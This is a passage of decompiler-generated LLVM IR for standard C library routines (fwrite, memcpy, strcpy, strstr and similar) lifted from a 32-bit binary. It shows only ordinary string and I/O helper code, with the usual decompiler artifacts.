  store i32 %v0_8052bde, i32* %eax.global-to-local, align 4
  store i32 %v0_8052b7c, i32* @ebp, align 4
  ret i32 %v0_8052bde

; uselistorder directives
  uselistorder i32 %v0_8052bde, { 1, 0 }
  uselistorder i32 %v0_8052bd0, { 1, 0 }
  uselistorder i32 %v1_8052bcd, { 1, 0 }
  uselistorder i32 %v0_8052bb1, { 0, 2, 1 }
  uselistorder i32 %v0_8052b97, { 1, 0 }
  uselistorder label %dec_label_pc_8052bdb, { 1, 0 }
  uselistorder label %dec_label_pc_8052bd0, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8052bcb.dec_label_pc_8052bcd_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8052b97, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8052be8 = load i32, i32* @esi, align 4
  %v0_8052be9 = load i32, i32* @ebx, align 4
  store i32 %v0_8052be9, i32* %stack_var_-8, align 4
  %v4_8052bed = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052bed, i32* @ebx, align 4
  %v3_8052bf2 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8052bf2, i32* @esi, align 4
  %v0_8052c03 = load i32, i32* @ebx, align 4
  %v6_8052c04 = call i32 @__GI_fwrite_unlocked(i32 %v0_8052c03, i64 1, i32 %v3_8052bf2, i32 %arg2)
  %v1_8052c0e = load i32, i32* @esi, align 4
  %v12_8052c0e = icmp eq i32 %v6_8052c04, %v1_8052c0e
  %v3_8052c10 = select i1 %v12_8052c0e, i32 %v6_8052c04, i32 -1
  %v2_8052c16 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052c16, i32* @ebx, align 4
  store i32 %v0_8052be8, i32* @esi, align 4
  ret i32 %v3_8052c10

; uselistorder directives
  uselistorder i32 %v6_8052c04, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8052c1c = load i32, i32* @edi, align 4
  %v0_8052c1d = load i32, i32* @esi, align 4
  %v0_8052c1e = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_8052c23 = trunc i64 %arg2 to i32
  store i32 %v4_8052c23, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_8052c2b = inttoptr i32 %arg4 to i16*
  %v2_8052c2b = load i16, i16* %v1_8052c2b, align 2
  %v1_8052c2e = and i16 %v2_8052c2b, 192
  %v6_8052c33 = icmp eq i16 %v1_8052c2e, 192
  br i1 %v6_8052c33, label %dec_label_pc_8052c4e, label %dec_label_pc_8052c3a

dec_label_pc_8052c3a:                             ; preds = %entry
  %v0_8052c3a = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_8052c42 = call i32 @__stdio_trans2w_o(i16* %v1_8052c2b, i32 128, i32 %v0_8052c3a, i32 %v0_8052c3a, i32 %v0_8052c1e, i32 %v0_8052c1d, i32 %v0_8052c1c)
  %v1_8052c4a = icmp eq i32 %v9_8052c42, 0
  %v1_8052c4c = icmp eq i1 %v1_8052c4a, false
  br i1 %v1_8052c4c, label %dec_label_pc_8052c8e, label %dec_label_pc_8052c4e

dec_label_pc_8052c4e:                             ; preds = %dec_label_pc_8052c3a, %entry
  %v2_8052c4e = icmp eq i32 %v4_8052c23, 0
  br i1 %v2_8052c4e, label %dec_label_pc_8052c8e, label %dec_label_pc_8052c52

dec_label_pc_8052c52:                             ; preds = %dec_label_pc_8052c4e
  %v1_8052c52 = icmp eq i32 %arg3, 0
  br i1 %v1_8052c52, label %dec_label_pc_8052c8e, label %dec_label_pc_8052c56

dec_label_pc_8052c56:                             ; preds = %dec_label_pc_8052c52
  %v9_8052c5b = udiv i64 4294967295, %arg2
  %v10_8052c5b = trunc i64 %v9_8052c5b to i32
  %v6_8052c5f = icmp ult i32 %v10_8052c5b, %arg3
  br i1 %v6_8052c5f, label %dec_label_pc_8052c7b, label %dec_label_pc_8052c61

dec_label_pc_8052c61:                             ; preds = %dec_label_pc_8052c56
  %sext = mul i64 %arg2, 4294967296
  %v2_8052c64 = sdiv i64 %sext, 4294967296
  %v3_8052c64 = sext i32 %arg3 to i64
  %v4_8052c64 = mul nsw i64 %v3_8052c64, %v2_8052c64
  %v5_8052c64 = trunc i64 %v4_8052c64 to i32
  %v0_8052c67 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_8052c6d = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_8052c64, i32 %v0_8052c67, i32 %v10_8052c5b)
  %v6_8052c6d = sext i32 %v5_8052c6d to i64
  %v10_8052c77 = udiv i64 %v6_8052c6d, %arg2
  %v11_8052c77 = trunc i64 %v10_8052c77 to i32
  br label %dec_label_pc_8052c90

dec_label_pc_8052c7b:                             ; preds = %dec_label_pc_8052c56
  %v0_8052c7b = load i32, i32* @ebx, align 4
  %v1_8052c7b = inttoptr i32 %v0_8052c7b to i32*
  %v2_8052c7b = load i32, i32* %v1_8052c7b, align 4
  %v1_8052c7d = or i32 %v2_8052c7b, 8
  %v1_8052c80 = trunc i32 %v1_8052c7d to i16
  %v3_8052c80 = inttoptr i32 %v0_8052c7b to i16*
  store i16 %v1_8052c80, i16* %v3_8052c80, align 2
  %v0_8052c83 = load i32, i32* %stack_var_-28, align 4
  %v1_8052c83 = call i32 @__errno_location(i32 %v0_8052c83)
  %v1_8052c88 = inttoptr i32 %v1_8052c83 to i32*
  store i32 22, i32* %v1_8052c88, align 4
  br label %dec_label_pc_8052c8e

dec_label_pc_8052c8e:                             ; preds = %dec_label_pc_8052c52, %dec_label_pc_8052c4e, %dec_label_pc_8052c3a, %dec_label_pc_8052c7b
  br label %dec_label_pc_8052c90

dec_label_pc_8052c90:                             ; preds = %dec_label_pc_8052c61, %dec_label_pc_8052c8e
  %v0_8052c93 = phi i32 [ %v11_8052c77, %dec_label_pc_8052c61 ], [ 0, %dec_label_pc_8052c8e ]
  store i32 %v0_8052c1d, i32* @esi, align 4
  store i32 %v0_8052c1c, i32* @edi, align 4
  ret i32 %v0_8052c93

; uselistorder directives
  uselistorder i32 %v0_8052c3a, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052c90, { 1, 0 }
  uselistorder label %dec_label_pc_8052c8e, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052c95 = load i32, i32* @esi, align 4
  store i32 %v0_8052c95, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8052c96 = sdiv i32 %sext, 16777216
  store i32 %v4_8052c96, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052c9e = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052c9e, i32* %edi.global-to-local, align 4
  %v2_8052ca4 = udiv i32 %v4_8052c96, 4
  %v3_8052ca7 = inttoptr i32 %arg2 to i8*
  %v4_8052ca7 = bitcast i16* %arg1 to i8*
  %v5_8052ca7 = call i8* @_memcpy(i8* %v4_8052ca7, i8* %v3_8052ca7, i32 %v2_8052ca4)
  %v6_8052ca7 = ptrtoint i8* %v5_8052ca7 to i32
  store i32 %v6_8052ca7, i32* @ecx, align 4
  %v0_8052ca9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052ca9 = and i32 %v0_8052ca9, 2
  %v3_8052ca9 = icmp eq i32 %v2_8052ca9, 0
  br i1 %v3_8052ca9, label %dec_label_pc_8052caf, label %dec_label_pc_8052cad

dec_label_pc_8052cad:                             ; preds = %entry
  %v0_8052cad = load i32, i32* %esi.global-to-local, align 4
  %v1_8052cad = inttoptr i32 %v0_8052cad to i16*
  %v2_8052cad = load i16, i16* %v1_8052cad, align 2
  %v3_8052cad = load i32, i32* %edi.global-to-local, align 4
  %v4_8052cad = inttoptr i32 %v3_8052cad to i16*
  store i16 %v2_8052cad, i16* %v4_8052cad, align 2
  %v5_8052cad = load i32, i32* %edi.global-to-local, align 4
  %v6_8052cad = load i32, i32* %esi.global-to-local, align 4
  %v7_8052cad = load i1, i1* @df, align 1
  %v8_8052cad = select i1 %v7_8052cad, i32 -2, i32 2
  %v9_8052cad = add i32 %v8_8052cad, %v5_8052cad
  %v10_8052cad = add i32 %v8_8052cad, %v6_8052cad
  store i32 %v9_8052cad, i32* %edi.global-to-local, align 4
  store i32 %v10_8052cad, i32* %esi.global-to-local, align 4
  %v0_8052caf.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052caf

dec_label_pc_8052caf:                             ; preds = %entry, %dec_label_pc_8052cad
  %v0_8052caf = phi i32 [ %v0_8052ca9, %entry ], [ %v0_8052caf.pre, %dec_label_pc_8052cad ]
  %v2_8052caf = urem i32 %v0_8052caf, 2
  %v3_8052caf = icmp eq i32 %v2_8052caf, 0
  br i1 %v3_8052caf, label %dec_label_pc_8052cb4, label %dec_label_pc_8052cb3

dec_label_pc_8052cb3:                             ; preds = %dec_label_pc_8052caf
  %v0_8052cb3 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052cb3 = inttoptr i32 %v0_8052cb3 to i8*
  %v2_8052cb3 = load i8, i8* %v1_8052cb3, align 1
  %v3_8052cb3 = load i32, i32* %edi.global-to-local, align 4
  %v4_8052cb3 = inttoptr i32 %v3_8052cb3 to i8*
  store i8 %v2_8052cb3, i8* %v4_8052cb3, align 1
  %v5_8052cb3 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052cb3 = load i32, i32* %esi.global-to-local, align 4
  %v7_8052cb3 = load i1, i1* @df, align 1
  %v8_8052cb3 = select i1 %v7_8052cb3, i32 -1, i32 1
  %v9_8052cb3 = add i32 %v8_8052cb3, %v5_8052cb3
  %v10_8052cb3 = add i32 %v8_8052cb3, %v6_8052cb3
  store i32 %v9_8052cb3, i32* %edi.global-to-local, align 4
  store i32 %v10_8052cb3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052cb4

dec_label_pc_8052cb4:                             ; preds = %dec_label_pc_8052caf, %dec_label_pc_8052cb3
  store i32 %v4_8052c9e, i32* %eax.global-to-local, align 4
  %v2_8052cb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052cb8, i32* @esi, align 4
  ret i32 %v4_8052c9e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_8052cb4, { 1, 0 }
  uselistorder label %dec_label_pc_8052caf, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8052cbc = load i32, i32* @edi, align 4
  %v4_8052cc5 = ptrtoint i8* %arg1 to i32
  %v5_8052cc9 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8052cc9 = ptrtoint i8* %v5_8052cc9 to i32
  store i32 %v6_8052cc9, i32* @ecx, align 4
  store i32 %v0_8052cbc, i32* @edi, align 4
  ret i32 %v4_8052cc5

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8052cd7 = load i32, i32* @esi, align 4
  store i32 %v0_8052cd7, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052cdf = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052cdf, i32* %edi.global-to-local, align 4
  %v3_8052ce3 = call i32 @_strlen(i8* %arg1)
  %v2_8052ce5 = add i32 %v4_8052cdf, -1
  store i32 %v2_8052ce5, i32* %edi.global-to-local, align 4
  %v4_8052ce6.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8052ce6.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8052ce6

dec_label_pc_8052ce6:                             ; preds = %dec_label_pc_8052ce6, %entry
  %v2_8052ce7 = phi i32 [ %v7_8052ce7, %dec_label_pc_8052ce6 ], [ %v2_8052ce5, %entry ]
  %v8_8052ce6 = phi i1 [ %v5_8052ce7, %dec_label_pc_8052ce6 ], [ %v8_8052ce6.pre, %entry ]
  %v4_8052ce6 = phi i32 [ %v0_8052ce8, %dec_label_pc_8052ce6 ], [ %v4_8052ce6.pre, %entry ]
  %v0_8052ce6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052ce6 = inttoptr i32 %v0_8052ce6 to i8*
  %v2_8052ce6 = load i8, i8* %v1_8052ce6, align 1
  %v3_8052ce6 = zext i8 %v2_8052ce6 to i32
  %v5_8052ce6 = and i32 %v4_8052ce6, -256
  %v6_8052ce6 = or i32 %v3_8052ce6, %v5_8052ce6
  store i32 %v6_8052ce6, i32* %eax.global-to-local, align 4
  %v9_8052ce6 = select i1 %v8_8052ce6, i32 -1, i32 1
  %v10_8052ce6 = add i32 %v0_8052ce6, %v9_8052ce6
  store i32 %v10_8052ce6, i32* %esi.global-to-local, align 4
  %v3_8052ce7 = inttoptr i32 %v2_8052ce7 to i8*
  store i8 %v2_8052ce6, i8* %v3_8052ce7, align 1
  %v4_8052ce7 = load i32, i32* %edi.global-to-local, align 4
  %v5_8052ce7 = load i1, i1* @df, align 1
  %v6_8052ce7 = select i1 %v5_8052ce7, i32 -1, i32 1
  %v7_8052ce7 = add i32 %v6_8052ce7, %v4_8052ce7
  store i32 %v7_8052ce7, i32* %edi.global-to-local, align 4
  %v0_8052ce8 = load i32, i32* %eax.global-to-local, align 4
  %v3_8052ce8 = trunc i32 %v0_8052ce8 to i8
  %v4_8052ce8 = icmp eq i8 %v3_8052ce8, 0
  %v1_8052cea = icmp eq i1 %v4_8052ce8, false
  br i1 %v1_8052cea, label %dec_label_pc_8052ce6, label %dec_label_pc_8052cec

dec_label_pc_8052cec:                             ; preds = %dec_label_pc_8052ce6
  store i32 %v4_8052cdf, i32* %eax.global-to-local, align 4
  %v2_8052cf0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052cf0, i32* @esi, align 4
  ret i32 %v4_8052cdf

; uselistorder directives
  uselistorder i32 %v0_8052ce8, { 1, 0 }
  uselistorder i32 %v7_8052ce7, { 1, 0 }
  uselistorder i1 %v5_8052ce7, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8052cf5 = ptrtoint i8* %arg1 to i32
  %v2_8052cfd = mul i32 %arg2, 256
  %v3_8052cfd = and i32 %v2_8052cfd, 65280
  %v4_8052cfd = and i32 %arg2, -65281
  %v5_8052cfd = or i32 %v3_8052cfd, %v4_8052cfd
  %v8_8052cff.pre = load i1, i1* @df, align 1
  %v9_8052cff = select i1 %v8_8052cff.pre, i32 -1, i32 1
  br label %dec_label_pc_8052cff

dec_label_pc_8052cff:                             ; preds = %dec_label_pc_8052d04, %entry
  %v4_8052cff = phi i32 [ %v6_8052cff, %dec_label_pc_8052d04 ], [ %v5_8052cfd, %entry ]
  %v7_8052cff = phi i32 [ %v10_8052cff, %dec_label_pc_8052d04 ], [ %v4_8052cf5, %entry ]
  %v1_8052cff = inttoptr i32 %v7_8052cff to i8*
  %v2_8052cff = load i8, i8* %v1_8052cff, align 1
  %v10_8052cff = add i32 %v7_8052cff, %v9_8052cff
  %v3_8052d00 = udiv i32 %v4_8052cff, 256
  %v4_8052d00 = trunc i32 %v3_8052d00 to i8
  %v16_8052d00 = icmp eq i8 %v2_8052cff, %v4_8052d00
  br i1 %v16_8052d00, label %dec_label_pc_8052d0d, label %dec_label_pc_8052d04

dec_label_pc_8052d04:                             ; preds = %dec_label_pc_8052cff
  %v3_8052cff = zext i8 %v2_8052cff to i32
  %v5_8052cff = and i32 %v4_8052cff, -256
  %v6_8052cff = or i32 %v3_8052cff, %v5_8052cff
  %v4_8052d04 = icmp eq i8 %v2_8052cff, 0
  %v1_8052d06 = icmp eq i1 %v4_8052d04, false
  br i1 %v1_8052d06, label %dec_label_pc_8052cff, label %dec_label_pc_8052d08

dec_label_pc_8052d08:                             ; preds = %dec_label_pc_8052d04
  br label %dec_label_pc_8052d0d

dec_label_pc_8052d0d:                             ; preds = %dec_label_pc_8052cff, %dec_label_pc_8052d08
  %v0_8052d0d = phi i32 [ 1, %dec_label_pc_8052d08 ], [ %v10_8052cff, %dec_label_pc_8052cff ]
  %v1_8052d0f = add i32 %v0_8052d0d, -1
  ret i32 %v1_8052d0f

; uselistorder directives
  uselistorder i8 %v2_8052cff, { 1, 2, 0 }
  uselistorder i32 %v4_8052cff, { 1, 0 }
  uselistorder i32 -65281, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052d0d, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052d15 = load i32, i32* @esi, align 4
  store i32 %v0_8052d15, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052d1d = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052d1d, i32* %edi.global-to-local, align 4
  %v4_8052d21.pre = load i32, i32* @eax, align 4
  %v8_8052d21.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8052d21

dec_label_pc_8052d21:                             ; preds = %dec_label_pc_8052d21.dec_label_pc_8052d21_crit_edge, %entry
  %v2_8052d22 = phi i32 [ %v7_8052d22, %dec_label_pc_8052d21.dec_label_pc_8052d21_crit_edge ], [ %v4_8052d1d, %entry ]
  %v8_8052d21 = phi i1 [ %v5_8052d22, %dec_label_pc_8052d21.dec_label_pc_8052d21_crit_edge ], [ %v8_8052d21.pre, %entry ]
  %v4_8052d21 = phi i32 [ %v0_8052d23, %dec_label_pc_8052d21.dec_label_pc_8052d21_crit_edge ], [ %v4_8052d21.pre, %entry ]
  %v7_8052d21 = phi i32 [ %v0_8052d21.pre, %dec_label_pc_8052d21.dec_label_pc_8052d21_crit_edge ], [ %arg2, %entry ]
  %v1_8052d21 = inttoptr i32 %v7_8052d21 to i8*
  %v2_8052d21 = load i8, i8* %v1_8052d21, align 1
  %v3_8052d21 = zext i8 %v2_8052d21 to i32
  %v5_8052d21 = and i32 %v4_8052d21, -256
  %v6_8052d21 = or i32 %v3_8052d21, %v5_8052d21
  store i32 %v6_8052d21, i32* %eax.global-to-local, align 4
  %v9_8052d21 = select i1 %v8_8052d21, i32 -1, i32 1
  %v10_8052d21 = add i32 %v7_8052d21, %v9_8052d21
  store i32 %v10_8052d21, i32* %esi.global-to-local, align 4
  %v3_8052d22 = inttoptr i32 %v2_8052d22 to i8*
  store i8 %v2_8052d21, i8* %v3_8052d22, align 1
  %v4_8052d22 = load i32, i32* %edi.global-to-local, align 4
  %v5_8052d22 = load i1, i1* @df, align 1
  %v6_8052d22 = select i1 %v5_8052d22, i32 -1, i32 1
  %v7_8052d22 = add i32 %v6_8052d22, %v4_8052d22
  store i32 %v7_8052d22, i32* %edi.global-to-local, align 4
  %v0_8052d23 = load i32, i32* %eax.global-to-local, align 4
  %v3_8052d23 = trunc i32 %v0_8052d23 to i8
  %v4_8052d23 = icmp eq i8 %v3_8052d23, 0
  %v1_8052d25 = icmp eq i1 %v4_8052d23, false
  br i1 %v1_8052d25, label %dec_label_pc_8052d21.dec_label_pc_8052d21_crit_edge, label %dec_label_pc_8052d27

dec_label_pc_8052d21.dec_label_pc_8052d21_crit_edge: ; preds = %dec_label_pc_8052d21
  %v0_8052d21.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052d21

dec_label_pc_8052d27:                             ; preds = %dec_label_pc_8052d21
  store i32 %v4_8052d1d, i32* %eax.global-to-local, align 4
  %v2_8052d2b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052d2b, i32* @edx, align 4
  %v2_8052d2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052d2c, i32* @esi, align 4
  ret i32 %v4_8052d1d

; uselistorder directives
  uselistorder i32 %v0_8052d23, { 1, 0 }
  uselistorder i32 %v7_8052d22, { 1, 0 }
  uselistorder i1 %v5_8052d22, { 1, 0 }
  uselistorder i32 %v4_8052d1d, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052d45 = load i32, i32* @esi, align 4
  store i32 %v0_8052d45, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052d51 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052d51, i32* %edi.global-to-local, align 4
  %v1_8052d55 = add i32 %arg3, 1
  store i32 %v1_8052d55, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052d56

dec_label_pc_8052d56:                             ; preds = %dec_label_pc_8052d59, %entry
  %v3_8052d5a = phi i32 [ %v4_8052d51, %entry ], [ %v8_8052d5a, %dec_label_pc_8052d59 ]
  %v0_8052d56 = phi i32 [ %v1_8052d55, %entry ], [ %v0_8052d56.pre, %dec_label_pc_8052d59 ]
  %v1_8052d56 = add i32 %v0_8052d56, -1
  %v8_8052d56 = icmp eq i32 %v1_8052d56, 0
  store i32 %v1_8052d56, i32* %ecx.global-to-local, align 4
  br i1 %v8_8052d56, label %.loopexit, label %dec_label_pc_8052d59

dec_label_pc_8052d59:                             ; preds = %dec_label_pc_8052d56
  %v0_8052d59 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052d59 = inttoptr i32 %v0_8052d59 to i8*
  %v2_8052d59 = load i8, i8* %v1_8052d59, align 1
  %v10_8052d59 = load i1, i1* @df, align 1
  %v11_8052d59 = select i1 %v10_8052d59, i32 -1, i32 1
  %v12_8052d59 = add i32 %v11_8052d59, %v0_8052d59
  store i32 %v12_8052d59, i32* %esi.global-to-local, align 4
  %v4_8052d5a = inttoptr i32 %v3_8052d5a to i8*
  store i8 %v2_8052d59, i8* %v4_8052d5a, align 1
  %v5_8052d5a = load i32, i32* %edi.global-to-local, align 4
  %v6_8052d5a = load i1, i1* @df, align 1
  %v7_8052d5a = select i1 %v6_8052d5a, i32 -1, i32 1
  %v8_8052d5a = add i32 %v7_8052d5a, %v5_8052d5a
  store i32 %v8_8052d5a, i32* %edi.global-to-local, align 4
  %v6_8052d5b = icmp eq i8 %v2_8052d59, 0
  %v1_8052d5d = icmp eq i1 %v6_8052d5b, false
  %v0_8052d56.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_8052d5d, label %dec_label_pc_8052d56, label %dec_label_pc_8052d5f

dec_label_pc_8052d5f:                             ; preds = %dec_label_pc_8052d59
  %v1_8052d5f = add i32 %v0_8052d56.pre, -1
  store i32 %v1_8052d5f, i32* %ecx.global-to-local, align 4
  %v2_8052d60 = sext i8 %v2_8052d59 to i32
  %v4_8052d60 = inttoptr i32 %v8_8052d5a to i8*
  %v5_8052d60 = call i8* @_memset(i8* %v4_8052d60, i32 %v2_8052d60, i32 %v1_8052d5f)
  %v6_8052d60 = ptrtoint i8* %v5_8052d60 to i32
  store i32 %v6_8052d60, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_8052d56, %dec_label_pc_8052d5f
  %v2_8052d66 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052d66, i32* @edx, align 4
  %v2_8052d67 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052d67, i32* @esi, align 4
  ret i32 %v4_8052d51

; uselistorder directives
  uselistorder i32 %v8_8052d5a, { 0, 2, 1 }
  uselistorder i8 %v2_8052d59, { 0, 2, 1 }
  uselistorder i32 %v1_8052d56, { 1, 0 }
  uselistorder i32 %v4_8052d51, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_8052d6c = ptrtoint i8* %tmp4 to i32
  %v8_8052d7f8 = icmp eq i32 %tmp, 0
  %v1_8052d8010 = icmp eq i1 %v8_8052d7f8, false
  br i1 %v1_8052d8010, label %dec_label_pc_8052d79, label %dec_label_pc_8052d82

dec_label_pc_8052d79:                             ; preds = %entry, %dec_label_pc_8052d7e
  %v1_8052d7f12 = phi i32 [ %v1_8052d7f, %dec_label_pc_8052d7e ], [ %tmp, %entry ]
  %v0_8052d8211 = phi i32 [ %v1_8052d7e, %dec_label_pc_8052d7e ], [ %v4_8052d6c, %entry ]
  %v1_8052d79 = inttoptr i32 %v0_8052d8211 to i8*
  %v2_8052d79 = load i8, i8* %v1_8052d79, align 1
  %v3_8052d79 = icmp eq i8 %v2_8052d79, 0
  br i1 %v3_8052d79, label %dec_label_pc_8052d82, label %dec_label_pc_8052d7e

dec_label_pc_8052d7e:                             ; preds = %dec_label_pc_8052d79
  %v1_8052d7e = add i32 %v0_8052d8211, 1
  %v1_8052d7f = add i32 %v1_8052d7f12, -1
  %v8_8052d7f = icmp eq i32 %v1_8052d7f, 0
  %v1_8052d80 = icmp eq i1 %v8_8052d7f, false
  br i1 %v1_8052d80, label %dec_label_pc_8052d79, label %dec_label_pc_8052d82

dec_label_pc_8052d82:                             ; preds = %dec_label_pc_8052d7e, %dec_label_pc_8052d79, %entry
  %v0_8052d82.lcssa = phi i32 [ %v4_8052d6c, %entry ], [ %v0_8052d8211, %dec_label_pc_8052d79 ], [ %v1_8052d7e, %dec_label_pc_8052d7e ]
  %v2_8052d82 = sub i32 %v0_8052d82.lcssa, %v4_8052d6c
  ret i32 %v2_8052d82

; uselistorder directives
  uselistorder i32 %v1_8052d7f, { 1, 0 }
  uselistorder i32 %v0_8052d8211, { 0, 2, 1 }
  uselistorder i32 %v4_8052d6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052d79, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_8052d8b = load i32, i32* @ebx, align 4
  %v4_8052d8f = ptrtoint i8* %arg2 to i32
  %v2_8052d97 = load i8, i8* %arg2, align 1
  %v1_8052d9a = icmp eq i8 %v2_8052d97, 0
  br i1 %v1_8052d9a, label %dec_label_pc_8052e4e, label %dec_label_pc_8052da5

dec_label_pc_8052da5:                             ; preds = %entry
  %v1_8052da5 = add i32 %arg1, -1
  br label %dec_label_pc_8052da6

dec_label_pc_8052da6:                             ; preds = %dec_label_pc_8052db2, %dec_label_pc_8052da5
  %v0_8052da6 = phi i32 [ %v1_8052da6, %dec_label_pc_8052db2 ], [ %v1_8052da5, %dec_label_pc_8052da5 ]
  %v1_8052da6 = add i32 %v0_8052da6, 1
  %v1_8052da7 = inttoptr i32 %v1_8052da6 to i8*
  %v2_8052da7 = load i8, i8* %v1_8052da7, align 1
  %v1_8052daa = icmp eq i8 %v2_8052da7, 0
  br i1 %v1_8052daa, label %dec_label_pc_8052e4c, label %dec_label_pc_8052db2

dec_label_pc_8052db2:                             ; preds = %dec_label_pc_8052da6
  %v14_8052db2 = icmp eq i8 %v2_8052da7, %v2_8052d97
  %v1_8052db5 = icmp eq i1 %v14_8052db2, false
  br i1 %v1_8052db5, label %dec_label_pc_8052da6, label %dec_label_pc_8052db7

dec_label_pc_8052db7:                             ; preds = %dec_label_pc_8052db2
  %v1_8052db7 = add i32 %v4_8052d8f, 1
  %v2_8052dbe = inttoptr i32 %v1_8052db7 to i8*
  %v3_8052dbe = load i8, i8* %v2_8052dbe, align 1
  %v1_8052dc2 = icmp eq i8 %v3_8052dbe, 0
  br i1 %v1_8052dc2, label %dec_label_pc_8052e4e, label %dec_label_pc_8052dca

dec_label_pc_8052dca:                             ; preds = %dec_label_pc_8052db7
  %v1_8052dca = add i32 %v0_8052da6, 2
  %v1_8052e14 = add i32 %v4_8052d8f, 2
  %v2_8052e14 = inttoptr i32 %v1_8052e14 to i8*
  br label %dec_label_pc_8052e00

dec_label_pc_8052dd5:                             ; preds = %dec_label_pc_8052e44
  %v2_8052dd5 = inttoptr i32 %v0_8052e06 to i8*
  %v3_8052dd5 = load i8, i8* %v2_8052dd5, align 1
  br label %dec_label_pc_8052df3.preheader

dec_label_pc_8052df3.preheader:                   ; preds = %dec_label_pc_8052dd5, %dec_label_pc_8052e00
